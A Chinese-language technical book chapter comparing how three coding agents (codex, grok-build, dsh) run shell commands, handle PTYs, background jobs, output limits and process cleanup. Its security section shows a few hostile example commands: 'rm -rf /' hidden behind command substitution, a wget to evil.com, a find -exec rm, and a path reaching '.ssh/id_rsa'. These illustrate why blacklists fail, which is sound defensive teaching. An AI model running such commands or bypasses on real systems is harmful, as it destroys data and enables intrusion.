# 第 7 章 Agent 怎样执行 Shell 命令：三种策略

::: info 本章要解决的问题
第 6 章让 Agent 能修改文件，但还不能判断修改是否正确。类型检查、lint、测试、构建和开发服务器都需要执行命令，因此下一项核心工具是 Shell。

Shell 的难点不在“启动一个进程”，而在同时处理短命令、长命令、交互输入、大量输出、取消和后台任务。本章比较 codex、grok-build 和 dsh 的三种做法。
:::

## 7.1 执行命令要回答的问题

**和子进程怎么通信。** Agent 执行命令的方式是启动一个 shell 子进程,把命令交给它跑;命令怎么送进去、输出怎么拿回来,有两种方式,核心区别是"子进程看到的对面是谁":

| | 管道(`spawn` 默认) | PTY(伪终端) |
|---|---|---|
| 是什么 | 接在子进程输入输出上的字节通道 | 伪造的一个"真终端"环境 |
| 子进程的感知 | 对面是程序,不是终端 | 对面是一个有人在用的终端 |
| 程序的行为 | 降级表现:去掉颜色和进度条、换缓冲方式,要交互的程序可能直接不干活 | 完整表现:颜色、进度条、交互问答都正常 |
| 拿到的输出 | 纯文本,干净、省 token | 带 ANSI 控制字符,给模型前要先清理 |
| 什么时候用 | 绝大多数命令 | 命令需要交互(问答、全屏界面)时 |

普通命令用管道;确实需要交互的命令才开 PTY。

**命令之间的状态保不保留。** `cd`、环境变量要不要跨命令生效:保留就贴近人在终端里的习惯,不保留则每条命令自包含、并发安全。

**命令时长差异极大。** `git status` 二十毫秒,`pnpm install` 一分钟,`vitest --watch` 永不退出——接口必须同时接待三种命令。

**输出可能非常大。** 编译失败三千行、测试日志上万行。常用三招:截断(保留头尾,报错常在两头)、按 token 设预算、落盘(完整输出写文件,返回尾部加路径)。

**持续运行的命令需要后台管理。** 放后台后立刻返回任务 id;完成时由系统主动通知模型,而不是让它 `sleep` 之后反复查询。后台任务要有状态机,不能发一个 id 就不管:

![后台 job 从创建到结束的状态和相关资源](/diagrams/ch05-job-lifecycle.svg)

三个容易漏的问题:输出要能**增量读**(接着上次的位置);会话结束要**清理**还在跑的任务并在日志里记下最终状态;重启后发现进程已经消失,要**诚实标记失联**,不能伪装成"已完成"。

问题列完了。下面看三家的三套策略——它们不是逐题作答,而是各自把一个目标放在第一位,再让所有答案围着它组织。

## 7.2 codex 的策略:一个工具,到点让位

codex 只用一个命令工具,靠**时间参数**消化长短命令的差异:命令跑了一段时间(默认 10 秒,可配 250ms~30s)还没结束,就把控制权**交还给模型**——命令继续在跑,模型可以先干别的,之后用同一个会话继续读输出、继续写输入。

这套策略把**交互体验放在第一位**:PTY 支持最完整(工具提供 `tty` 参数,可开),交互式程序、半途追问都接得住;长命令自然形成一个会话,不需要单独的后台任务概念;超时也不会杀命令,只是把等待挂起。输出按 token 设预算(默认一万)。

代价:模型必须自己管理会话 id——"哪条命令在哪个会话里"成了模型的责任;让位后再续读的时序,也要模型理解对。

## 7.3 grok 的策略:前后台分治,状态保留

grok 把命令**明确分成两个世界**:前台命令等待完成,有超时预算(默认十几秒,生产环境可放宽到小时级);后台命令立即返回任务 id,由 `task_output` / `kill_task` / `monitor` 一族工具管理,**完成时系统主动通知**——工具说明里直白写着"不要轮询、不要 sleep 等待"。

命令之间**保留状态**:一个持久的 shell 会话,工作目录和环境变量跨命令有效,像人一直开着的终端窗口。审批也做了进去:后台命令必须填 `description`,它会成为审批弹窗里给用户看的"为什么要跑这条命令"。输出按字节设上限,保留头尾、可以给完整日志的路径。

代价:会话状态会漂移(当前目录可能和模型以为的不一样)、并发执行要小心;前台后台两套接口,工具面更宽。

## 7.4 dsh 的策略:无状态,确定性优先

dsh 反着来:**每条命令都是全新进程**,工具说明里明说"目录和变量不跨命令保留——用 `workdir` 参数,别用 `cd`"。后台任务同样有 job 族(`job_output` / `job_kill`)和完成通知;交互式程序不塞进 Shell 工具,交给独立的 terminal 能力组。输出超限时落盘保留全文,返回尾部加文件路径。

这套策略把**确定性放在第一位**:每条命令自包含,天然可以并行;从日志重放会话时,每条请求都带着完整的工作目录和参数,不依赖某个 shell 进程里的内存状态——崩溃恢复因此简单。

代价:模型每条命令都要带 `workdir`,稍啰嗦;交互式体验是三家里最弱的。

## 7.5 与策略无关的两条底线

无论选哪套策略,下面两件事的答案是一样的。

**底线一:命令安全,关键字黑名单挡不住。** 执行命令前做校验,最直接的想法是用黑名单禁掉 `rm`、`sudo`。但 Shell 能组合和替换命令,黑名单形同虚设:

```bash
rm 被禁?  $(echo rm) -rf /           # 变量展开绕过
curl 被禁? wget http://evil.com/x    # 换个等价命令
find / -name '*.log' -exec rm {} \;  # 危险操作藏在合法命令的参数里
```

更可靠的方向是**解析命令结构**:识别哪个参数会读文件、`-exec` 后面接的是什么,判断命令实际会做什么,而不是匹配字符串。codex 为此实现了专门的命令策略引擎。但真正的强制隔离仍然要靠操作系统(第 13 章)。

**底线二:启动子进程的三个坑。**

**坑一:超时只杀了最外层。** `bash -c "npm test & npm run dev"` 是一整棵进程树;只终止最上层的 bash,后代可能继续跑,留下占用端口的孤儿进程。

最低要求是:启动时把命令放进独立的进程组,终止时对整组先发 SIGTERM(留几秒宽限)再 SIGKILL;Windows 上用等价的进程树终止机制。结束后确认整组都退了,别只看 shell。

**坑二:环境变量把凭证带给子进程。** 体验上,设置 `NO_COLOR=1`、`PAGER=cat` 之类的非交互环境,输出对模型更友好。安全上,如果子进程继承 Agent 的全部环境变量,命令也会得到其中的 `API_KEY` 等凭证。

保守做法是默认只传必要的变量、过滤名字含 KEY/TOKEN/SECRET 的;但按名字过滤只是辅助措施,真正的边界仍在沙箱。

**坑三:路径检查看着严密,实则漏。** 相对路径的基准(工作区根还是进程当前目录)要显式定义;`../../.ssh/id_rsa` 不能因为"是相对路径"就放行。

此外,`path.resolve()` 不会解析符号链接,`startsWith(root)` 会把 `/allowed-other` 误判进 `/allowed`。高风险写入最终要靠 OS 沙箱,字符串检查只是第一道检查。

一句话总结这两条底线:**命令解析、进程管理、路径检查都是"减少事故"的工具;真正的安全边界只能由操作系统提供**(第 13 章)。

## 【对比小结】

| | codex | grok-build | dsh |
|---|-------|-----------|-----|
| 策略 | 一个工具,到点让位 | 前后台分治 + 持久会话 | 无状态 + jobs |
| 放在第一位的是 | 交互体验 | 行为友好、审批体验 | 确定性、可恢复 |
| 命令调度 | 时间参数交还控制权,命令继续跑 | 前台等待 / 后台立即返回 | 每条命令独立执行;持续运行走 jobs |
| 会话状态 | 长命令有会话 | 持久会话(cwd/env 保留) | **无状态**(workdir 替代 cd) |
| 交互式程序 | 强(PTY + 继续输入) | 有(ptyctl 支持) | 弱(另有 terminal 能力组) |
| 输出限制 | token 预算(默认 10k) | 字节上限,保留头尾并可给日志路径 | 内存留尾部,超限可落盘保留全文 |
| 完成通知 | 会话内继续读 | 事件通知("不要轮询"写进工具说明) | jobs 事件通知 |
| 申请额外权限 | 参数直接放在调用中 | `description` 必填(用于审批 UI) | 通过 `sandbox_permissions` 申请 |

**核心取舍:**三套策略没有胜者,它们分别优先考虑交互性、审批与使用体验、确定性。

选型前先回答三个问题:

1. 模型是否会频繁运行交互式程序?
2. 会话是否需要重放和恢复?
3. 上下文预算是否紧张?

## 本章小结

- Shell 是 Agent 用得最多也最危险的工具;要回答的问题清单:和子进程通信(管道/PTY)、状态保不保留、长短命令、输出限制、后台管理
- 三套策略:codex **一个工具到点让位**(交互优先,模型管会话 id);grok **前后台分治+保留状态**(行为友好,状态会漂移);dsh **无状态+workdir**(确定性优先,可并行可重放,交互最弱)
- 通信:普通命令用管道,需要交互的命令才用 PTY
- 后台任务靠完成通知而不是轮询;对失联任务要诚实标记,不能伪装完成
- 超长输出:截断、token 预算、落盘;"已截断"和"全文在文件里"必须分开表达
- 关键字黑名单不可靠;要解析命令结构判断行为,强制隔离靠操作系统
- 子进程三个坑:进程组、环境变量、路径

到这里,Agent 已经能修改文件,并通过命令运行检查。但真实任务还需要找到目标代码、记录较长任务的进度、在信息不足时询问用户,并处理同一轮中的多个工具调用。下一章补齐这些工具层能力。
